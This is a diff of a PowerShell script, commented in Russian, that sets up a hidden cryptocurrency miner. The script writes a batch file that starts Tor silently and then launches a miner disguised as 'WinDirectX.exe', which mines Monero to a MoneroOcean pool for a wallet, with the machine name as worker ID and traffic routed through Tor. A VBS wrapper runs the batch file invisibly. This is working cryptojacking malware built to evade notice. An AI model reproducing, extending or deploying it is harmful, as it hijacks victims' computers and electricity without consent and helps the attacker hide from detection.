@@ -89,10 +89,20 @@ if (!(Test-Path "$path\tor.exe")) {
 }
 
 
-# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (ОПТИМИЗИРОВАНО: +30-40% к ХЕШРЕЙТУ)
-$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 30 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
+# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (TOR + МАЙНЕР)
+# Создаем BAT-файл, который последовательно запускает сеть и майнинг
+$cmd = "@echo off`n" +
+       "start /b $path\tor.exe --SocksPort 9050 --Quiet`n" +
+       "timeout /t 20 /nobreak >nul`n" +
+       "start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
+
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
-"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False" | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
+
+# Создаем VBS, который запускает этот BAT-файл абсолютно невидимо
+$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`n" +
+       "WshShell.Run `"$path\run_cache.bat`", 0, False"
+
+$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
 
 
 
